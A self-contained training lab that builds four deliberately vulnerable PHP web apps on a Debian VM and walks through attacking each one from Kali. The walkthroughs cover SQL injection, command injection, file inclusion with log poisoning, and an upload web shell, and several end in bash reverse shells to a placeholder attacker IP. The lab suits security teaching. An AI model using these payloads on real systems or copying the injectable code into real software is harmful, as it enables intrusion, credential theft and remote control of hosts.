# Lab: Web Attack Range

## Objective

Build four vulnerable web applications on your Debian VM that you can attack from Kali. Each one targets a different web vulnerability. Practice identifying and exploiting each one independently, then chain them together.

## What You'll Practice

- SQL injection (authentication bypass + data extraction)
- Command injection (from web form to reverse shell)
- Local File Inclusion (reading sensitive files + log poisoning for RCE)
- File upload (bypassing filters + getting a web shell)

---

## Setup (on Debian — 192.168.244.132)

### Install dependencies

```bash
sudo apt update
sudo apt install apache2 php libapache2-mod-php php-mysql mariadb-server -y
sudo systemctl enable --now apache2
sudo systemctl enable --now mariadb
```

### Create the database

```bash
sudo mysql << 'SQLEOF'
CREATE DATABASE webapp;
USE webapp;

CREATE TABLE users (
    id INT AUTO_INCREMENT PRIMARY KEY,
    username VARCHAR(50),
    password VARCHAR(100),
    email VARCHAR(100),
    role VARCHAR(20)
);

INSERT INTO users VALUES (1, 'admin', 'SuperSecretAdmin!', 'admin@company.com', 'admin');
INSERT INTO users VALUES (2, 'john', 'Welcome123', 'john@company.com', 'user');
INSERT INTO users VALUES (3, 'sarah', 'P@ssw0rd!', 'sarah@company.com', 'user');
INSERT INTO users VALUES (4, 'svc_backup', 'BackupStr0ng!2026', 'backup@company.com', 'service');
INSERT INTO users VALUES (5, 'flag_user', 'FLAG{sqli_extraction_complete}', 'flag@company.com', 'flag');

CREATE TABLE secrets (
    id INT AUTO_INCREMENT PRIMARY KEY,
    description VARCHAR(100),
    value VARCHAR(200)
);

INSERT INTO secrets VALUES (1, 'SSH Key Password', 'KeyP@ss2026!');
INSERT INTO secrets VALUES (2, 'Database Root', 'r00tDBacc3ss!');
INSERT INTO secrets VALUES (3, 'VPN Gateway', 'vpn-gateway.internal:1194');
INSERT INTO secrets VALUES (4, 'Flag', 'FLAG{secret_table_found}');

GRANT ALL ON webapp.* TO 'webuser'@'localhost' IDENTIFIED BY 'webpass';
FLUSH PRIVILEGES;
SQLEOF
```

### Create the main landing page

```bash
cat << 'EOF' | sudo tee /var/www/html/index.html
<!DOCTYPE html>
<html>
<head><title>Web Attack Range</title></head>
<body>
<h1>Web Attack Range</h1>
<p>Practice web vulnerabilities. Each page has a different flaw.</p>
<ul>
    <li><a href="/sqli/">SQL Injection Lab</a></li>
    <li><a href="/cmdi/">Command Injection Lab</a></li>
    <li><a href="/lfi/">Local File Inclusion Lab</a></li>
    <li><a href="/upload/">File Upload Lab</a></li>
</ul>
<!-- Developer note: config backup at /backup/config.php.bak -->
</body>
</html>
EOF
```

### Create a config file to find via LFI

```bash
cat << 'PHPEOF' | sudo tee /var/www/html/config.php
<?php
$db_host = "localhost";
$db_user = "webuser";
$db_pass = "webpass";
$db_name = "webapp";
$secret_api_key = "sk_live_FLAG{config_file_leaked}";
?>
PHPEOF

# Also create a backup copy that's readable as plaintext
sudo mkdir -p /var/www/html/backup
sudo cp /var/www/html/config.php /var/www/html/backup/config.php.bak
```

### Create a sensitive file in a user's home directory

```bash
sudo mkdir -p /home/webadmin/.ssh
echo "-----BEGIN OPENSSH PRIVATE KEY-----" | sudo tee /home/webadmin/.ssh/id_rsa
echo "FLAG{ssh_key_via_lfi}" | sudo tee -a /home/webadmin/.ssh/id_rsa
echo "-----END OPENSSH PRIVATE KEY-----" | sudo tee -a /home/webadmin/.ssh/id_rsa
```

---

## Vulnerability 1: SQL Injection

### Build the vulnerable pages

```bash
sudo mkdir -p /var/www/html/sqli

# Login page (authentication bypass)
cat << 'PHPEOF' | sudo tee /var/www/html/sqli/login.php
<?php
$conn = new mysqli("localhost", "webuser", "webpass", "webapp");
$message = "";

if(isset($_POST['user']) && isset($_POST['pass'])) {
    $user = $_POST['user'];
    $pass = $_POST['pass'];
    $query = "SELECT * FROM users WHERE username='$user' AND password='$pass'";
    $result = $conn->query($query);
    
    if($result && $result->num_rows > 0) {
        $row = $result->fetch_assoc();
        $message = "<div style='color:green'><h2>Welcome, {$row['username']}!</h2>
                    <p>Role: {$row['role']}</p>
                    <p>Email: {$row['email']}</p></div>";
    } else {
        $message = "<div style='color:red'>Invalid username or password.</div>";
    }
}
?>
<html>
<head><title>SQLi Lab - Login</title></head>
<body>
<h1>SQL Injection Lab — Login</h1>
<p><a href="/sqli/search.php">Go to Search Page</a></p>
<form method="POST">
    <label>Username:</label><br>
    <input type="text" name="user" size="30"><br><br>
    <label>Password:</label><br>
    <input type="password" name="pass" size="30"><br><br>
    <button type="submit">Login</button>
</form>
<?php echo $message; ?>
<hr>
<h3>Challenges:</h3>
<ol>
    <li>Bypass the login without knowing any credentials</li>
    <li>Login as the admin user specifically</li>
    <li>Extract all usernames and passwords</li>
</ol>
</body>
</html>
PHPEOF

# Search page (UNION injection for data extraction)
cat << 'PHPEOF' | sudo tee /var/www/html/sqli/search.php
<?php
$conn = new mysqli("localhost", "webuser", "webpass", "webapp");
$results = "";

if(isset($_GET['id'])) {
    $id = $_GET['id'];
    $query = "SELECT id, username, email FROM users WHERE id=$id";
    $result = $conn->query($query);
    
    if($result && $row = $result->fetch_assoc()) {
        $results = "<table border='1' cellpadding='5'>
                    <tr><th>ID</th><th>Username</th><th>Email</th></tr>
                    <tr><td>{$row['id']}</td><td>{$row['username']}</td><td>{$row['email']}</td></tr>
                    </table>";
    } else {
        $results = "<p>No user found with that ID.</p>";
        if($conn->error) {
            $results .= "<p style='color:red'>Error: {$conn->error}</p>";
        }
    }
}
?>
<html>
<head><title>SQLi Lab - Search</title></head>
<body>
<h1>SQL Injection Lab — User Search</h1>
<p><a href="/sqli/login.php">Go to Login Page</a></p>
<form method="GET">
    <label>Search by User ID:</label>
    <input type="text" name="id" size="10">
    <button type="submit">Search</button>
</form>
<?php echo $results; ?>
<hr>
<h3>Challenges:</h3>
<ol>
    <li>Find out how many columns the query returns</li>
    <li>Determine the database version</li>
    <li>List all tables in the database</li>
    <li>Extract ALL usernames and passwords (including from the secrets table)</li>
    <li>Read /etc/passwd through SQL injection</li>
</ol>
</body>
</html>
PHPEOF

# Create index for sqli directory
echo '<h1>SQL Injection Lab</h1><p><a href="login.php">Login Page</a> | <a href="search.php">Search Page</a></p>' | sudo tee /var/www/html/sqli/index.html
```

### How to attack it (solution guide)

**Login bypass:**
```bash
# In the username field, type:   ' OR 1=1--
# Password: anything
curl -X POST "http://DEBIAN_IP/sqli/login.php" -d "user=' OR 1=1--&pass=x"

# Login as admin specifically:
curl -X POST "http://DEBIAN_IP/sqli/login.php" -d "user=admin'--&pass=x"
```

**UNION injection on search page:**
```bash
# Step 1: Confirm injection
curl "http://DEBIAN_IP/sqli/search.php?id=1'"
# Error message confirms SQLi

# Step 2: Find column count
curl "http://DEBIAN_IP/sqli/search.php?id=1 ORDER BY 1"   # works
curl "http://DEBIAN_IP/sqli/search.php?id=1 ORDER BY 2"   # works
curl "http://DEBIAN_IP/sqli/search.php?id=1 ORDER BY 3"   # works
curl "http://DEBIAN_IP/sqli/search.php?id=1 ORDER BY 4"   # error → 3 columns

# Step 3: UNION SELECT
curl "http://DEBIAN_IP/sqli/search.php?id=-1 UNION SELECT 1,2,3"

# Step 4: Extract info
curl "http://DEBIAN_IP/sqli/search.php?id=-1 UNION SELECT 1,@@version,database()"
curl "http://DEBIAN_IP/sqli/search.php?id=-1 UNION SELECT 1,GROUP_CONCAT(table_name),3 FROM information_schema.tables WHERE table_schema='webapp'"
curl "http://DEBIAN_IP/sqli/search.php?id=-1 UNION SELECT 1,GROUP_CONCAT(column_name),3 FROM information_schema.columns WHERE table_name='users'"
curl "http://DEBIAN_IP/sqli/search.php?id=-1 UNION SELECT 1,GROUP_CONCAT(username,':',password),3 FROM users"
curl "http://DEBIAN_IP/sqli/search.php?id=-1 UNION SELECT 1,GROUP_CONCAT(description,':',value),3 FROM secrets"

# Step 5: Read files
curl "http://DEBIAN_IP/sqli/search.php?id=-1 UNION SELECT 1,LOAD_FILE('/etc/passwd'),3"
```

---

## Vulnerability 2: Command Injection

### Build the vulnerable page

```bash
sudo mkdir -p /var/www/html/cmdi

cat << 'PHPEOF' | sudo tee /var/www/html/cmdi/index.php
<?php
$output = "";
if(isset($_GET['target'])) {
    $target = $_GET['target'];
    $output = shell_exec("ping -c 2 " . $target);
}
?>
<html>
<head><title>Command Injection Lab</title></head>
<body>
<h1>Command Injection Lab — Network Diagnostics</h1>
<form method="GET">
    <label>Enter hostname or IP to ping:</label>
    <input type="text" name="target" size="30" placeholder="192.168.244.129">
    <button type="submit">Ping</button>
</form>
<?php if($output): ?>
<h2>Results:</h2>
<pre><?php echo htmlspecialchars($output); ?></pre>
<?php endif; ?>
<hr>
<h3>Challenges:</h3>
<ol>
    <li>Execute the "id" command through the form</li>
    <li>Read /etc/passwd</li>
    <li>Find what user the web server runs as</li>
    <li>List the home directories</li>
    <li>Get a full reverse shell back to your Kali machine</li>
    <li>Try at least 3 different injection characters (; | && $())</li>
</ol>
</body>
</html>
PHPEOF
```

### How to attack it

```bash
# Basic injection tests
curl "http://DEBIAN_IP/cmdi/?target=127.0.0.1;id"
curl "http://DEBIAN_IP/cmdi/?target=127.0.0.1|whoami"
curl "http://DEBIAN_IP/cmdi/?target=127.0.0.1%26%26cat%20/etc/passwd"
curl "http://DEBIAN_IP/cmdi/?target=\$(whoami)"

# Enumerate
curl "http://DEBIAN_IP/cmdi/?target=127.0.0.1;ls%20-la%20/home"
curl "http://DEBIAN_IP/cmdi/?target=127.0.0.1;cat%20/home/webadmin/.ssh/id_rsa"
curl "http://DEBIAN_IP/cmdi/?target=127.0.0.1;cat%20/var/www/html/config.php"

# Reverse shell (listener on Kali first: nc -lvnp 4444)
curl "http://DEBIAN_IP/cmdi/?target=127.0.0.1;bash%20-c%20'bash%20-i%20>%26%20/dev/tcp/KALI_IP/4444%200>%261'"
```

---

## Vulnerability 3: Local File Inclusion

### Build the vulnerable page

```bash
sudo mkdir -p /var/www/html/lfi

echo "<h1>About Us</h1><p>We are a technology company.</p>" | sudo tee /var/www/html/lfi/about.php
echo "<h1>Services</h1><p>We offer consulting and development.</p>" | sudo tee /var/www/html/lfi/services.php
echo "<h1>Contact</h1><p>Email: info@company.com</p>" | sudo tee /var/www/html/lfi/contact.php

cat << 'PHPEOF' | sudo tee /var/www/html/lfi/index.php
<?php
$page = isset($_GET['page']) ? $_GET['page'] : null;
?>
<html>
<head><title>LFI Lab</title></head>
<body>
<h1>Local File Inclusion Lab</h1>
<nav>
    <a href="?page=about.php">About</a> |
    <a href="?page=services.php">Services</a> |
    <a href="?page=contact.php">Contact</a>
</nav>
<hr>
<?php
if($page) {
    include($page);
} else {
    echo "<p>Select a page above.</p>";
}
?>
<hr>
<h3>Challenges:</h3>
<ol>
    <li>Read /etc/passwd through LFI</li>
    <li>Read the web application's config.php source code (hint: php://filter)</li>
    <li>Read the SSH key from /home/webadmin/.ssh/id_rsa</li>
    <li>Achieve Remote Code Execution via log poisoning</li>
    <li>Get a full reverse shell through the LFI</li>
</ol>
</body>
</html>
PHPEOF
```

### How to attack it

```bash
# Basic LFI
curl "http://DEBIAN_IP/lfi/?page=../../../../etc/passwd"

# Read config.php as base64 (php://filter)
curl "http://DEBIAN_IP/lfi/?page=php://filter/convert.base64-encode/resource=../config.php"
echo "BASE64_OUTPUT" | base64 -d

# Read SSH key
curl "http://DEBIAN_IP/lfi/?page=../../../../home/webadmin/.ssh/id_rsa"

# Log poisoning for RCE
# Step 1: Inject PHP into the Apache access log via User-Agent
curl "http://DEBIAN_IP/" -A "<?php system(\$_GET['cmd']); ?>"

# Step 2: Include the log file with a command
curl "http://DEBIAN_IP/lfi/?page=../../../../var/log/apache2/access.log&cmd=whoami"

# Step 3: Get a reverse shell through the poisoned log
# Kali: nc -lvnp 4444
curl "http://DEBIAN_IP/lfi/?page=../../../../var/log/apache2/access.log&cmd=bash%20-c%20'bash%20-i%20>%26%20/dev/tcp/KALI_IP/4444%200>%261'"
```

---

## Vulnerability 4: File Upload

### Build the vulnerable page

```bash
sudo mkdir -p /var/www/html/upload/uploads
sudo chmod 777 /var/www/html/upload/uploads

cat << 'PHPEOF' | sudo tee /var/www/html/upload/index.php
<?php
$message = "";
if(isset($_FILES['file'])) {
    $name = $_FILES['file']['name'];
    $target = "/var/www/html/upload/uploads/" . basename($name);
    
    if(move_uploaded_file($_FILES['file']['tmp_name'], $target)) {
        $message = "<p style='color:green'>Uploaded: <a href='uploads/$name'>uploads/$name</a></p>";
    } else {
        $message = "<p style='color:red'>Upload failed.</p>";
    }
}
?>
<html>
<head><title>File Upload Lab</title></head>
<body>
<h1>File Upload Lab</h1>
<form method="POST" enctype="multipart/form-data">
    <label>Select file to upload:</label><br><br>
    <input type="file" name="file"><br><br>
    <button type="submit">Upload</button>
</form>
<?php echo $message; ?>
<hr>
<h3>Challenges:</h3>
<ol>
    <li>Upload a PHP web shell and execute commands</li>
    <li>Use the web shell to read /etc/passwd</li>
    <li>Upgrade from web shell to a full reverse shell</li>
    <li>Read the flag from the database using the web shell</li>
</ol>
</body>
</html>
PHPEOF
```

### How to attack it

```bash
# Create a web shell
echo '<?php system($_GET["cmd"]); ?>' > shell.php

# Upload it
curl -F "file=@shell.php" "http://DEBIAN_IP/upload/"

# Execute commands through the web shell
curl "http://DEBIAN_IP/upload/uploads/shell.php?cmd=whoami"
curl "http://DEBIAN_IP/upload/uploads/shell.php?cmd=id"
curl "http://DEBIAN_IP/upload/uploads/shell.php?cmd=cat+/etc/passwd"

# Read the database through the web shell
curl "http://DEBIAN_IP/upload/uploads/shell.php?cmd=mysql+-u+webuser+-pwebpass+-e+'SELECT+*+FROM+webapp.users'"
curl "http://DEBIAN_IP/upload/uploads/shell.php?cmd=mysql+-u+webuser+-pwebpass+-e+'SELECT+*+FROM+webapp.secrets'"

# Reverse shell
# Kali: nc -lvnp 4444
curl "http://DEBIAN_IP/upload/uploads/shell.php?cmd=bash+-c+'bash+-i+>%26+/dev/tcp/KALI_IP/4444+0>%261'"
```

---

## Challenge: Chain them together

Real targets don't have one vulnerability — they have several, and you chain them:

```
1. Start at the main page → read the HTML comment about /backup/config.php.bak
2. Read the backup config → get database credentials
3. Use SQLi on the search page to extract ALL data including secrets table
4. Use command injection to enumerate the filesystem
5. Use LFI to read SSH keys and config files
6. Use file upload to get a persistent web shell
7. Upgrade to a reverse shell from any of the above
```

---

## Cleanup

```bash
sudo rm -rf /var/www/html/sqli /var/www/html/cmdi /var/www/html/lfi /var/www/html/upload
sudo rm -rf /var/www/html/backup /var/www/html/config.php
sudo rm -rf /home/webadmin
sudo mysql -e "DROP DATABASE webapp; DROP USER 'webuser'@'localhost';"
echo "<h1>It works!</h1>" | sudo tee /var/www/html/index.html
```
